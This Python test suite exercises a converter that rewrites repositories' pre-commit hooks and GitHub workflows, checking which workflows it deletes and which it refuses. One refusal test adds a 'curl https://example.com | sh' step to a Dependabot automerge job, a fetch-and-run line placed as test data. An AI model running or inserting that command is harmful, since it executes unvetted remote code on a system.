#!/usr/bin/env python3
"""scripts/convert_repo.py, over repos built here in the shapes the fleet has.

The conversion is the last PR wave, so what it writes is pinned case by case:

  - the rev-pinned python-sdlc hooks and the standalone Gourmand and Gatehouse
    hooks both become examples/pre-commit-floating.yaml, and a hooks file with
    other repos in it keeps them
  - .github/workflows/ci.yml becomes examples/ci.yml byte for byte, and every
    other workflow is deleted when each of its jobs is a row of the spec's
    "What `sdlc event` runs" table: the `sdlc ci` job, an allowlisted reusable
    call, gatehouse.yml and release.yml as the examples have them, an inline
    CodeQL, PyPI publish or Dependabot automerge job
  - one job no row covers refuses the whole repo (exit 2), naming the file and
    the job, and writes nothing; the RPM and Pages workflows are told to become
    [tool.sdlc.commands]
  - a deleted PyPI publish becomes `publish = "pypi"`, a deleted container-release
    call becomes [tool.sdlc.image], and neither replaces a value already there
  - nothing is written without --apply, a second run finds nothing to do, and
    .specify/ is never touched

Run inside the image, which has the interpreter and PyYAML the script needs:
  podman run --rm -v .:/src:ro,z -w /src --entrypoint /opt/constitution-venv/bin/python3 \
      quay.io/crunchtools/sdlc:<tag> tests/test_convert_repo.py
"""

from __future__ import annotations

import importlib.util
import subprocess
import sys
import tempfile
import tomllib
from pathlib import Path

import sdlc_root  # noqa: F401 -- puts the repo root on sys.path
import yaml

from sdlc_jobs import _core

ROOT = Path(__file__).resolve().parent.parent
SCRIPT = ROOT / "scripts" / "convert_repo.py"
HOOKS = (ROOT / "examples" / "pre-commit-floating.yaml").read_text()
CI = (ROOT / "examples" / "ci.yml").read_text()
GATEHOUSE = (ROOT / "examples" / "gatehouse.yml").read_text()
RELEASE = (ROOT / "examples" / "release.yml").read_text()
RELEASE_OPEN = (ROOT / "examples" / "release-open.yml").read_text()
BOOTSTRAP = (ROOT / "bin" / "sdlc-bootstrap").read_text()

FAILED: list[str] = []
REFUSED = 2  # the script's exit code for a shape it will not guess at
EXECUTABLE = 0o111
WF = ".github/workflows/"


def check(name: str, cond: bool, detail: str = "") -> None:
    print(f"{'ok  ' if cond else 'FAIL'} {name}" + (f" -- {detail}" if detail and not cond else ""))
    if not cond:
        FAILED.append(name)


PINNED_HOOKS = """\
# Every check runs from python-sdlc, pinned here once.
default_install_hook_types: [pre-commit, pre-push]

repos:
  - repo: https://github.com/crunchtools/python-sdlc
    rev: v0.8.0
    hooks:
      - id: sdlc-commit
      - id: sdlc-push
"""

STANDALONE_HOOKS = """\
repos:
  - repo: local
    hooks:
      - id: gourmand
        name: Gourmand (AI slop detection)
        entry: podman run --rm -v .:/src:Z -w /src quay.io/crunchtools/gourmand:latest check --full
        language: system
        pass_filenames: false
        always_run: true
        stages: [pre-commit, pre-merge-commit]
      - id: gatehouse
        name: Gatehouse (AI code review, staged diff)
        entry: bash -c 'git diff --cached | podman run --rm -i quay.io/crunchtools/gatehouse:latest --stdin'
        language: system
        pass_filenames: false
        always_run: true
        stages: [pre-commit, pre-merge-commit]
"""

RUFF_AND_STANDALONE = """\
repos:
  - repo: https://github.com/astral-sh/ruff-pre-commit
    rev: v0.17.1
    hooks:
      - id: ruff-check
""" + STANDALONE_HOOKS.split("repos:\n", 1)[1]

PINNED_STEP = """\
      - name: sdlc ci
        run: |
          set -eu
          rev=$(awk '/repo: https:\\/\\/github.com\\/crunchtools\\/python-sdlc/ {f=1; next}
                     f && /rev:/ {print $2; exit}' .pre-commit-config.yaml)
          [ -n "$rev" ] || { echo "no python-sdlc rev in .pre-commit-config.yaml" >&2; exit 2; }
          git clone -q --depth 1 --branch "$rev" https://github.com/crunchtools/python-sdlc "$RUNNER_TEMP/sdlc"
          $RUNNER_TEMP/sdlc/bin/sdlc ci
"""

GOURMAND = """\
name: Gourmand
on:
  pull_request:
jobs:
  gourmand:
    name: Code Quality (Gourmand)
    uses: crunchtools/gatehouse/.github/workflows/gourmand.yml@v0
"""

OLD_CI = (
    """\
name: CI
on:
  pull_request:
jobs:
  sdlc:
    name: sdlc ci
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
"""
    + PINNED_STEP
    + """
  gourmand:
    name: Code Quality (Gourmand)
    uses: crunchtools/gatehouse/.github/workflows/gourmand.yml@v0
"""
)

FLOATING_CI = """\
name: CI
on:
  push:
    branches: [main]
jobs:
  sdlc:
    name: sdlc ci
    runs-on: self-hosted
    steps:
      - name: Checkout
        uses: actions/checkout@v7
        with:
          persist-credentials: false
      - name: sdlc ci
        env:
          SDLC_IMAGE: ${{ vars.SDLC_IMAGE }}
        run: .sdlc/bin/sdlc ci
"""

MIXED = (
    """\
name: Tests
on:
  pull_request:
jobs:
  unit:
    name: unit
    runs-on: ubuntu-latest
    steps:
      - run: make test
  sdlc:
    name: sdlc ci
    runs-on: ubuntu-latest
    steps:
"""
    + PINNED_STEP
)

# publish.yml as the PyPI repos have it: build, then the pypa action over OIDC.
PUBLISH = """\
name: Publish
on:
  release:
    types: [published]
jobs:
  publish:
    runs-on: ubuntu-latest
    environment: pypi
    permissions:
      id-token: write
    steps:
      - uses: actions/checkout@v7
      - uses: astral-sh/setup-uv@v7
      - run: uv build
      - uses: pypa/gh-action-pypi-publish@release/v1
"""

# The same, as two jobs with the dist handed between them.
PUBLISH_SPLIT = """\
name: Publish
on:
  push:
    tags: ["v*"]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v6
        with:
          python-version: "3.13"
      - run: |
          python -m pip install --upgrade build
          python -m build
      - uses: actions/upload-artifact@v5
        with:
          name: dist
          path: dist/
  publish:
    needs: build
    runs-on: ubuntu-latest
    environment: pypi
    permissions:
      id-token: write
    steps:
      - uses: actions/download-artifact@v6
        with:
          name: dist
          path: dist/
      - uses: pypa/gh-action-pypi-publish@release/v1
"""

PUBLISH_UV = PUBLISH.replace(
    "      - uses: pypa/gh-action-pypi-publish@release/v1\n", "      - run: uv publish\n"
)

CODEQL = """\
name: CodeQL
on:
  push:
jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
    strategy:
      matrix:
        language: [python]
    steps:
      - uses: actions/checkout@v7
      - uses: github/codeql-action/init@v4
        with:
          languages: ${{ matrix.language }}
      - uses: github/codeql-action/autobuild@v4
      - uses: github/codeql-action/analyze@v4
"""

AUTOMERGE = """\
name: Dependabot
on:
  pull_request:
jobs:
  automerge:
    runs-on: ubuntu-latest
    if: github.event.pull_request.user.login == 'dependabot[bot]'
    permissions:
      contents: write
      pull-requests: write
    steps:
      - id: meta
        uses: dependabot/fetch-metadata@v2
      - run: gh pr merge --auto --squash "$PR_URL"
        env:
          PR_URL: ${{ github.event.pull_request.html_url }}
          GH_TOKEN: ${{ github.token }}
"""

CONTAINER_CALL = """\
name: Container
on:
  push:
jobs:
  container:
    uses: crunchtools/constitution/.github/workflows/container-release.yml@v1
    permissions:
      contents: read
    with:
      image: quay.io/crunchtools/mcp-example
      default-branch: master
      boot: mcp
      boot-env: |
        EXAMPLE_API_KEY=gate-dummy
      boot-timeout: 240
      rhsm: true
      sign: true
      downstream: mcp-a mcp-b
      cascade: true
    secrets:
      QUAY_USERNAME: ${{ secrets.QUAY_USERNAME }}
"""

PACKAGES = """\
name: Packages
on:
  push:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: rpmbuild -ba x.spec
  pages:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/deploy-pages@v4
"""

CONSTITUTION = "# per-repo constitution\nInherits: v1.44.0\n"
HOOKED = {".pre-commit-config.yaml": PINNED_HOOKS}


def make_repo(files: dict[str, str]) -> Path:
    repo = Path(tempfile.mkdtemp())
    (repo / ".git").mkdir()
    for name, text in files.items():
        (repo / name).parent.mkdir(parents=True, exist_ok=True)
        (repo / name).write_text(text)
    return repo


def snapshot(repo: Path) -> dict[str, str]:
    return {
        str(p.relative_to(repo)): p.read_text()
        for p in sorted(repo.rglob("*"))
        if p.is_file() and ".git" not in p.parts
    }


def convert(repo: Path, apply: bool = False, *extra: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, str(SCRIPT), str(repo), *(["--apply"] if apply else []), *extra],
        capture_output=True,
        text=True,
        check=False,
    )


def sdlc_cfg(repo: Path, name: str = "sdlc.toml") -> dict:
    return tomllib.loads(snapshot(repo).get(name, "")).get("tool", {}).get("sdlc", {})


def converted(files: dict[str, str]) -> tuple[Path, subprocess.CompletedProcess]:
    """A repo with the floating hooks and `files`, converted with --apply."""
    repo = make_repo({**HOOKED, **files})
    return repo, convert(repo, apply=True)


def refuses(label: str, files: dict[str, str], *wanted: str) -> subprocess.CompletedProcess:
    """`files` is refused (exit 2), nothing is written, and the message names `wanted`."""
    repo = make_repo({**HOOKED, **files})
    before = snapshot(repo)
    refused = convert(repo, apply=True)
    check(
        f"{label}: refused (exit 2), nothing written, and named",
        refused.returncode == REFUSED
        and "NOT CONVERTED" in refused.stderr
        and snapshot(repo) == before
        and all(w in refused.stderr for w in wanted),
        refused.stderr,
    )
    return refused


def gone(label: str, files: dict[str, str], *deleted: str) -> Path:
    """`files` converts: ci.yml is the example, `deleted` are gone, a second run is a no-op."""
    repo, done = converted(files)
    after = snapshot(repo)
    check(
        f"{label}: converts, ci.yml is examples/ci.yml byte for byte",
        done.returncode == 0 and after.get(WF + "ci.yml") == CI,
        done.stderr,
    )
    check(
        f"{label}: {', '.join(deleted)} deleted, no other workflow left",
        all(WF + d not in after for d in deleted)
        and [k for k in after if k.startswith(WF)] == [WF + "ci.yml"],
        str(sorted(after)),
    )
    again = convert(repo)
    check(
        f"{label}: a second run finds nothing to do",
        again.returncode == 0 and again.stdout == "",
        again.stderr + again.stdout,
    )
    return repo


# ------------------------------------------------- a rev-pinned Python repo

repo = make_repo(
    {
        ".pre-commit-config.yaml": PINNED_HOOKS,
        WF + "ci.yml": OLD_CI,
        WF + "gourmand.yml": GOURMAND,
        WF + "gatehouse.yml": "# an older comment\n" + GATEHOUSE,
        WF + "publish.yml": PUBLISH,
        "pyproject.toml": '[project]\nname = "x"\nversion = "0"\n',
        ".specify/memory/constitution.md": CONSTITUTION,
    }
)
before = snapshot(repo)
dry = convert(repo)
check("python: the dry run exits 0", dry.returncode == 0, dry.stderr)
check("python: the dry run prints a diff", "+++ b/.github/workflows/ci.yml" in dry.stdout)
check("python: the dry run changes nothing", snapshot(repo) == before)
done = convert(repo, apply=True)
after = snapshot(repo)
check("python: --apply exits 0", done.returncode == 0, done.stderr)
check("python: the hooks file is the floating example", after[".pre-commit-config.yaml"] == HOOKS)
check("python: ci.yml is examples/ci.yml byte for byte", after.get(WF + "ci.yml") == CI)
check(
    "python: .sdlc/bin/sdlc is bin/sdlc-bootstrap, executable",
    after.get(".sdlc/bin/sdlc") == BOOTSTRAP
    and (repo / ".sdlc/bin/sdlc").stat().st_mode & EXECUTABLE == EXECUTABLE,
)
check(
    "python: gourmand.yml, gatehouse.yml and publish.yml are deleted",
    [k for k in after if k.startswith(WF)] == [WF + "ci.yml"],
    str(sorted(after)),
)
check(
    "python: the publish job became publish = pypi in pyproject.toml",
    sdlc_cfg(repo, "pyproject.toml").get("publish") == "pypi",
    after["pyproject.toml"],
)
check("python: .specify is untouched", after[".specify/memory/constitution.md"] == CONSTITUTION)
check(
    "python: no hook repo is pinned at a rev",
    all("rev" not in r for r in yaml.safe_load(after[".pre-commit-config.yaml"])["repos"]),
)
again = convert(repo)
check(
    "python: a second run finds nothing to do",
    again.returncode == 0 and again.stdout == "",
    again.stdout,
)

# An image reference in the repo's config moves too; a longer name that only
# starts the same way does not.
for config in ("pyproject.toml", "sdlc.toml"):
    text = (
        '[tool.sdlc.ci.tests]\nimage = "quay.io/crunchtools/python-sdlc:0.8.0"\n'
        'other = "quay.io/crunchtools/python-sdlc-extras:1"\n'
    )
    repo = make_repo({".pre-commit-config.yaml": PINNED_HOOKS, config: text})
    convert(repo, apply=True)
    moved = snapshot(repo)[config]
    check(
        f"{config}: the python-sdlc image moves to quay.io/crunchtools/sdlc, a longer name stays",
        'image = "quay.io/crunchtools/sdlc:0.8.0"' in moved
        and "quay.io/crunchtools/python-sdlc-extras:1" in moved,
        moved,
    )

# A period ends a sentence; it is not part of the name. A name that goes on
# after the dot, or after a dash, is a different one.
for config in ("pyproject.toml", "sdlc.toml"):
    text = (
        "# the image is quay.io/crunchtools/python-sdlc.\n"
        '[tool.sdlc.ci.tests]\nimage = "quay.io/crunchtools/python-sdlc"\n'
        "# not quay.io/crunchtools/python-sdlc-extras or quay.io/crunchtools/python-sdlc.x\n"
    )
    repo = make_repo({".pre-commit-config.yaml": PINNED_HOOKS, config: text})
    convert(repo, apply=True)
    moved = snapshot(repo)[config]
    check(
        f"{config}: a python-sdlc reference ending a sentence is renamed",
        "# the image is quay.io/crunchtools/sdlc.\n" in moved
        and 'image = "quay.io/crunchtools/sdlc"' in moved,
        moved,
    )
    check(
        f"{config}: python-sdlc-extras and python-sdlc.x are left alone",
        "quay.io/crunchtools/python-sdlc-extras or quay.io/crunchtools/python-sdlc.x\n" in moved,
        moved,
    )

# A repo already floating, ci.yml and all: nothing to do but the old name.
repo = make_repo(
    {
        ".pre-commit-config.yaml": HOOKS,
        ".sdlc/bin/sdlc": BOOTSTRAP,
        WF + "ci.yml": CI,
    }
)
(repo / ".sdlc/bin/sdlc").chmod(0o755)
done = convert(repo, apply=True)
check(
    "floating: a repo already on the fleet file plans nothing",
    done.returncode == 0 and done.stdout == "" and snapshot(repo)[WF + "ci.yml"] == CI,
    done.stderr,
)

# ---------------------------------------------- what is deleted, by table row

repo = gone("an old ci.yml (sdlc ci + Gourmand)", {WF + "ci.yml": OLD_CI}, "gourmand.yml")
gone(
    "a floating sdlc ci job on its own runner, in its own file",
    {WF + "tests.yml": FLOATING_CI},
    "tests.yml",
)
gone(
    "a pinned sdlc ci job in a file of its own",
    {WF + "tests.yml": MIXED.split("  unit:")[0] + "  sdlc:" + MIXED.split("  sdlc:")[1]},
    "tests.yml",
)

# Each allowlisted reusable call is one row of the table.
CALLS = (
    "constitution/validate.yml@v1.46.0",
    "constitution/container-release.yml@v1",
    "constitution/dependency-audit.yml@v1",
    "constitution/dependabot-automerge.yml@v1",
    "gatehouse/gourmand.yml@v0",
    "gatehouse/review.yml@v0",
    "gatehouse/triage.yml@v0",
    "gatehouse/retriage.yml@v0",
    "ashigaru/router.yml@v5",
    "ashigaru/triage.yml@v2",
    "ashigaru/code.yml@v2",
    "ashigaru/fix.yml@v2",
    "ashigaru/review.yml@v2",
    "ashigaru/release.yml@v5",
    "ashigaru/release-tag.yml@v5",
    "python-sdlc/ashigaru/router.yml@v5",
)
for call in CALLS[:-1]:
    repo_name, rest = call.split("/", 1)
    text = (
        "name: Call\non:\n  pull_request:\njobs:\n  one:\n    permissions: {}\n"
        f"    uses: crunchtools/{repo_name}/.github/workflows/{rest}\n"
        "    secrets:\n      TOKEN: ${{ secrets.TOKEN }}\n"
    )
    if call.startswith("constitution/container-release"):
        text = text.replace(
            "    secrets:", "    with:\n      image: quay.io/x/y\n      boot: none\n    secrets:"
        )
    gone(f"a call of {call}", {WF + "call.yml": text}, "call.yml")

# A call's `if:` is kept only when it is one a canonical caller carries:
# anything narrower (a release branch) would be dropped by the fleet file.
GUARDED = (
    "name: Call\non:\n  push:\njobs:\n  one:\n"
    "    if: {cond}\n"
    "    uses: crunchtools/gatehouse/.github/workflows/review.yml@v0\n"
)
refuses(
    "a call narrowed by an unknown if:",
    {WF + "call.yml": GUARDED.format(cond="github.ref == 'refs/heads/release'")},
    "call.yml",
)
gone(
    "a call with a canonical if:, whitespace aside",
    {
        WF + "call.yml": GUARDED.format(
            cond=">-\n      github.event_name ==\n      'pull_request_target'"
        )
    },
    "call.yml",
)

# The retriage caller as constitution has it, on workflow_run.
RETRIAGE = """\
name: Gatehouse retriage
on:
  workflow_run:
    workflows: [Gatehouse]
    types: [completed]
permissions: {}
jobs:
  retriage:
    if: github.event.workflow_run.event == 'pull_request_review_comment'
    permissions:
      actions: write
    uses: crunchtools/gatehouse/.github/workflows/retriage.yml@v0
"""
gone("gatehouse-retriage.yml", {WF + "gatehouse-retriage.yml": RETRIAGE}, "gatehouse-retriage.yml")

# gatehouse.yml as the example has it, in all but comments, or with the old guard.
gone("gatehouse.yml", {WF + "gatehouse.yml": "# an older comment\n" + GATEHOUSE}, "gatehouse.yml")
OLD_GUARD = (
    GATEHOUSE.replace("^(\\.github/workflows|\\.sdlc)/", "^\\.github/workflows/")
    .replace(
        "a file out of .github/workflows/ or .sdlc/ unseen",
        "a workflow out of .github/workflows/ unseen",
    )
    .replace("modifies .github/workflows/ or .sdlc/ —", "modifies .github/workflows/ —")
)
check("the old guard is not the example's", OLD_GUARD != GATEHOUSE)
gone(
    "gatehouse.yml with the guard before gatehouse#150",
    {WF + "gatehouse.yml": OLD_GUARD},
    "gatehouse.yml",
)
refuses(
    "a gatehouse.yml customized beyond the guard",
    {WF + "gatehouse.yml": GATEHOUSE.replace("review.yml@v0", "review.yml@v1")},
    "gatehouse.yml",
    "guard",
)
refuses(
    "a guard script changed beyond gatehouse#150's lines",
    {
        WF + "gatehouse.yml": OLD_GUARD.replace(
            'echo "No workflow files changed."',
            'echo "No workflow files changed."\n          make audit',
        )
    },
    "gatehouse.yml",
)
check("the gatehouse example's guard covers .sdlc/", "|\\.sdlc)/" in GATEHOUSE)

# examples/release.yml and release-open.yml, for any default branch.
for branch in ("main", "trunk", "release/2.x"):
    for label, example in (("release.yml", RELEASE), ("release-open.yml", RELEASE_OPEN)):
        text = example.replace("refs/heads/main", f"refs/heads/{branch}").replace(
            "--base main", f"--base {branch}"
        )
        gone(f"{label} copied for {branch}", {WF + "release.yml": text}, "release.yml")
refuses(
    "a release.yml whose branch disagrees with itself",
    {WF + "release.yml": RELEASE.replace("--base main", "--base develop")},
    "release.yml",
    "open",
)
refuses(
    "a release.yml with an extra step",
    {
        WF + "release.yml": RELEASE.replace(
            "      - name: Check the version\n",
            "      - run: make x\n      - name: Check the version\n",
        )
    },
    "release.yml",
)

gone("an inline CodeQL job", {WF + "codeql.yml": CODEQL}, "codeql.yml")
refuses(
    "a CodeQL job with a step of its own",
    {
        WF + "codeql.yml": CODEQL.replace(
            "      - uses: github/codeql-action/autobuild@v4\n", "      - run: make\n"
        )
    },
    "codeql.yml",
    "analyze",
)
refuses(
    "a CodeQL job that never analyzes",
    {WF + "codeql.yml": CODEQL.replace("      - uses: github/codeql-action/analyze@v4\n", "")},
    "codeql.yml",
)
gone("an inline Dependabot automerge job", {WF + "automerge.yml": AUTOMERGE}, "automerge.yml")
refuses(
    "an automerge job that does more than merge",
    {WF + "automerge.yml": AUTOMERGE + "      - run: curl https://example.com | sh\n"},
    "automerge.yml",
)
refuses(
    "an automerge job open to every author",
    {WF + "automerge.yml": AUTOMERGE.replace("dependabot[bot]", "someone")},
    "automerge.yml",
)

# ----------------------------------------- a PyPI publish: publish = "pypi"

for label, text in (
    ("the pypa action", PUBLISH),
    ("uv publish", PUBLISH_UV),
    ("a build job and a publish job", PUBLISH_SPLIT),
):
    for config, start in (("pyproject.toml", '[project]\nname = "x"\n'), ("sdlc.toml", "")):
        repo = gone(
            f"publish.yml ({label}), {config}",
            {WF + "publish.yml": text, **({config: start} if start else {})},
            "publish.yml",
        )
        check(
            f"publish.yml ({label}): publish = pypi in {config}",
            sdlc_cfg(repo, config).get("publish") == "pypi",
            snapshot(repo).get(config, "(none)"),
        )
check(
    "a Python repo's pyproject without [tool.sdlc] gets the table at the end, still TOML",
    tomllib.loads(snapshot(repo).get("sdlc.toml", ""))["tool"]["sdlc"] == {"publish": "pypi"},
)

# Already there: nothing to write, and the old file still goes.
repo, done = converted(
    {
        WF + "publish.yml": PUBLISH.replace(
            "      - run: uv build\n",
            "      - run: uv python install 3.12\n      - run: uv build\n",
        )
    }
)
check(
    "a publish job that installs its Python with uv is still a publish job",
    done.returncode == 0 and sdlc_cfg(repo) == {"publish": "pypi"},
    done.stderr,
)
repo, done = converted(
    {WF + "publish.yml": PUBLISH, "sdlc.toml": '[tool.sdlc]\npublish = "pypi"\n'}
)
check(
    "publish already in [tool.sdlc]: left as it is",
    done.returncode == 0 and snapshot(repo)["sdlc.toml"] == '[tool.sdlc]\npublish = "pypi"\n',
    done.stderr,
)
repo, done = converted(
    {WF + "publish.yml": PUBLISH, "sdlc.toml": '[tool.sdlc]\nstacks = ["python"]\n'}
)
check(
    "publish next to other keys of an existing [tool.sdlc]",
    done.returncode == 0
    and sdlc_cfg(repo) == {"publish": "pypi", "stacks": ["python"]}
    and snapshot(repo)["sdlc.toml"].endswith('stacks = ["python"]\n'),
    snapshot(repo)["sdlc.toml"],
)
refuses(
    "a publish job beside a [tool.sdlc] publish that says otherwise",
    {WF + "publish.yml": PUBLISH, "sdlc.toml": '[tool.sdlc]\npublish = "none"\n'},
    "publish",
)

for label, text in (
    (
        "a token",
        PUBLISH.replace(
            "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
            "      - uses: pypa/gh-action-pypi-publish@release/v1\n        with:\n          password: ${{ secrets.PYPI_TOKEN }}\n",
        ),
    ),
    ("twine", PUBLISH.replace("uv build", "pip install twine && twine upload dist/*")),
    ("an uv publish token", PUBLISH_UV.replace("uv publish", "uv publish --token $T")),
    (
        "an unlisted run line",
        PUBLISH.replace(
            "      - run: uv build\n", "      - run: uv build\n      - run: make docs\n"
        ),
    ),
    ("an unlisted action", PUBLISH.replace("astral-sh/setup-uv@v7", "someone/setup@v1")),
    (
        "an env on the step",
        PUBLISH.replace(
            "      - run: uv build\n", "      - run: uv build\n        env:\n          X: y\n"
        ),
    ),
    (
        "a build with no publish",
        PUBLISH.replace("      - uses: pypa/gh-action-pypi-publish@release/v1\n", ""),
    ),
):
    refuses(f"a publish.yml with {label}", {WF + "publish.yml": text}, "publish.yml")

# ------------------------------- a container-release call: [tool.sdlc.image]

repo = gone(
    "a container-release call",
    {WF + "container.yml": CONTAINER_CALL, "Containerfile": "FROM scratch\n"},
    "container.yml",
)
image = sdlc_cfg(repo).get("image", {})
check(
    "container-release: its inputs are [tool.sdlc.image], values as YAML gave them",
    image
    == {
        "image": "quay.io/crunchtools/mcp-example",
        "boot": "mcp",
        "boot-env": "EXAMPLE_API_KEY=gate-dummy\n",
        "boot-timeout": 240,
        "rhsm": True,
    },
    str(image),
)
check(
    "container-release: sign, downstream, cascade and default-branch are dropped",
    not {"sign", "downstream", "cascade", "default-branch"} & set(image),
)
# What the converter writes, the image job must accept: a key it refuses would
# turn a converted repo's first image run into a 2.
check(
    "container-release: every key written is one the image job reads",
    set(image) <= _core.IMAGE_ENFORCED | _core.IMAGE_NOT_ENFORCED,
    str(sorted(set(image) - _core.IMAGE_ENFORCED - _core.IMAGE_NOT_ENFORCED)),
)
dry = convert(make_repo({**HOOKED, WF + "container.yml": CONTAINER_CALL}))
check(
    "container-release: the note says what was dropped",
    "dropped: cascade, default-branch, downstream, sign" in dry.stderr,
    dry.stderr,
)

# Already the same values: nothing written; a different value is refused.
same = '[tool.sdlc.image]\nimage = "quay.io/crunchtools/mcp-example"\nboot = "mcp"\n'
repo, done = converted({WF + "container.yml": CONTAINER_CALL, "sdlc.toml": same})
check(
    "container-release: values already in [tool.sdlc.image] are kept, the rest added",
    done.returncode == 0
    and sdlc_cfg(repo)["image"]["boot"] == "mcp"
    and sdlc_cfg(repo)["image"]["rhsm"] is True
    and snapshot(repo)["sdlc.toml"].count("boot = ") == 1,
    snapshot(repo)["sdlc.toml"],
)
refuses(
    "a container-release input that differs from [tool.sdlc.image]",
    {WF + "container.yml": CONTAINER_CALL, "sdlc.toml": same.replace('"mcp"', '"systemd"')},
    "boot",
    "[tool.sdlc.image]",
)
refuses(
    "a container-release input that is an expression",
    {WF + "container.yml": CONTAINER_CALL.replace("boot: mcp", "boot: ${{ vars.BOOT }}")},
    "boot",
    "expression",
)
refuses(
    "two container-release calls that disagree",
    {
        WF + "container.yml": CONTAINER_CALL,
        WF + "other.yml": CONTAINER_CALL.replace("mcp-example", "mcp-other"),
    },
    "[tool.sdlc.image]",
)
refuses(
    "a `with:` on any other call",
    {WF + "gourmand.yml": GOURMAND.replace("@v0\n", "@v0\n    with:\n      strict: true\n")},
    "gourmand.yml",
)

# ------------------------------------------------------ what it refuses

refused = refuses(
    "packages.yml (RPM build, Pages)",
    {WF + "packages.yml": PACKAGES},
    "packages.yml",
    "build",
    "pages",
    "[tool.sdlc.commands]",
    "sdlc run",
    "actions/deploy-pages",
)
check("the message names Pages as a human step", "human step" in refused.stderr, refused.stderr)

refused = refuses(
    "a workflow mixing sdlc ci with a job nothing covers",
    {WF + "tests.yml": MIXED},
    "tests.yml",
    "unit",
)
check(
    "a mixed workflow: the covered job is not named",
    "sdlc" not in refused.stderr.split("unit")[0].split("jobs:")[-1],
    refused.stderr,
)
refused = refuses(
    "two files, one uncovered: every uncovered file and job is named",
    {WF + "ci.yml": OLD_CI, WF + "a.yml": PACKAGES, WF + "b.yml": MIXED},
    "a.yml",
    "b.yml",
    "unit",
    "build",
)
check("the covered ci.yml is not named", "ci.yml" not in refused.stderr, refused.stderr)
refuses(
    "a ci.yml the stub cannot replace",
    {
        WF
        + "ci.yml": "name: CI\non: push\njobs:\n  build:\n    runs-on: x\n    steps:\n      - run: make\n"
    },
    "ci.yml",
    "build",
)
refuses(
    "a workflow with a workflow-level env",
    {
        WF + "tests.yml": MIXED.replace(
            "on:\n  pull_request:\n", "on:\n  pull_request:\nenv:\n  A: b\n"
        ).split("  unit:")[0]
        + "  sdlc:"
        + MIXED.split("  sdlc:")[1]
    },
    "tests.yml",
    "env",
)
refuses(
    "a workflow with no jobs", {WF + "empty.yml": "name: X\non: push\n"}, "empty.yml", "no jobs"
)
refuses(
    "a local call of a workflow that is itself refused",
    {
        WF
        + "caller.yml": "name: C\non: push\njobs:\n  c:\n    uses: ./.github/workflows/callee.yml\n",
        WF
        + "callee.yml": "name: D\non:\n  workflow_call:\njobs:\n  d:\n    runs-on: x\n    steps:\n      - run: make\n",
    },
    "callee.yml",
)
refuses(
    "a call of a crunchtools workflow not on the list",
    {
        WF
        + "x.yml": "name: X\non: push\njobs:\n  x:\n    uses: crunchtools/constitution/.github/workflows/gate.yml@v1\n"
    },
    "x.yml",
)
refuses(
    "a call of another org's workflow",
    {
        WF
        + "x.yml": "name: X\non: push\njobs:\n  x:\n    uses: someone/gatehouse/.github/workflows/review.yml@v0\n"
    },
    "x.yml",
)
refuses(
    "an sdlc ci step with its own env",
    {
        WF + "ci.yml": OLD_CI.replace(
            "      - name: sdlc ci\n", "      - name: sdlc ci\n        env:\n          FOO: bar\n"
        )
    },
    "ci.yml",
)
refuses(
    "an sdlc ci job with a service",
    {
        WF + "ci.yml": OLD_CI.replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n    services:\n      db:\n        image: x\n",
            1,
        )
    },
    "ci.yml",
)
refuses(
    "a kept workflow still cloning python-sdlc by rev",
    {
        WF + "ci.yml": OLD_CI,
        WF
        + "publish.yml": 'name: P\non: push\njobs:\n  p:\n    runs-on: x\n    steps:\n      - run: git clone --branch "$rev" https://github.com/crunchtools/python-sdlc x\n',
    },
    "publish.yml",
)

for broken in ("repos: [\n", "- a list\n"):
    repo = make_repo({".pre-commit-config.yaml": broken})
    refused = convert(repo)
    check(
        f"a hooks file that is not a YAML mapping ({broken.strip()!r}) is refused, not a traceback",
        refused.returncode == REFUSED and "Traceback" not in refused.stderr,
        refused.stderr,
    )
refused = refuses("a workflow that is not YAML", {WF + "x.yml": "jobs: [\n"}, "x.yml")
check("a workflow that is not YAML is not a traceback", "Traceback" not in refused.stderr)

repo = make_repo({".pre-commit-config.yaml": "repos: []\n"})
refused = convert(repo)
check(
    "a hooks file with nothing to replace is refused (exit 2)",
    refused.returncode == REFUSED,
    refused.stderr,
)

done_repo, done = converted({})
check(
    "a repo with no workflows gets ci.yml and the bootstrap",
    done.returncode == 0 and snapshot(done_repo).get(WF + "ci.yml") == CI,
    done.stderr,
)

# Other hooks beside the standalone ones: the floating ones are added.
repo = make_repo({".pre-commit-config.yaml": RUFF_AND_STANDALONE, WF + "gatehouse.yml": GATEHOUSE})
done = convert(repo, apply=True)
hooks = yaml.safe_load(snapshot(repo)[".pre-commit-config.yaml"])
check("other hooks: --apply exits 0", done.returncode == 0, done.stderr)
check(
    "other hooks: ruff is kept, the standalone hooks are gone, the floating ones added",
    [r["repo"] for r in hooks["repos"]] == ["https://github.com/astral-sh/ruff-pre-commit", "local"]
    and [h["id"] for h in hooks["repos"][1]["hooks"]] == ["sdlc-commit", "sdlc-push"],
)
check(
    "other hooks: both hook types are installed",
    hooks.get("default_install_hook_types") == ["pre-commit", "pre-push"],
)

# Standalone hooks sharing their `repo: local` item with a hook of the repo's
# own: only the two standalone hooks go.
OWN_HOOK = """\
      - id: shellcheck
        name: shellcheck
        entry: podman run --rm -v .:/mnt:ro,z -w /mnt docker.io/koalaman/shellcheck:v0.11.0 run.sh
        language: system
        pass_filenames: false
        stages: [pre-commit]
"""
repo = make_repo(
    {
        ".pre-commit-config.yaml": STANDALONE_HOOKS.replace(
            "    hooks:\n", "    hooks:\n" + OWN_HOOK, 1
        )
    }
)
done = convert(repo, apply=True)
hooks = yaml.safe_load(snapshot(repo)[".pre-commit-config.yaml"])
local = [[h["id"] for h in r["hooks"]] for r in hooks["repos"] if r["repo"] == "local"]
check(
    "a repo's own local hook survives beside the floating ones, with its settings",
    done.returncode == 0
    and local == [["shellcheck"], ["sdlc-commit", "sdlc-push"]]
    and hooks["repos"][0]["hooks"][0]["stages"] == ["pre-commit"],
    f"{local} {done.stderr}",
)


NEW_PINNED_HOOKS = PINNED_HOOKS.replace("crunchtools/python-sdlc", "crunchtools/sdlc")

